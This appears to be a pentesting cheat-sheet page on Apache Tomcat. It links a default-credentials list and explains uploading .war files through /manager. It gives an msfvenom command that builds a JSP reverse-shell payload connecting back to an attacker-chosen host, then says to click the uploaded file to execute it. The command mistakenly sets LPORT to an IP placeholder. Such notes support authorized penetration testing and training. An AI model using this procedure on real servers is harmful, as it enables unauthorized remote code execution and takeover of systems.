# Apache Tomcat

Default credentials list:

{% embed url="https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown" %}

Through /manager, you can upload .war files

Create **.war** file:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST_IP> LPORT=<LHOST_IP> -f war -o revshell.war
```

<figure><img src="../../.gitbook/assets/image (57).png" alt=""><figcaption><p>Uploaded file</p></figcaption></figure>

Click on the uploaded file to execute the payload.

{% hint style="info" %}
This is only allowed when you have the correct permissions
{% endhint %}
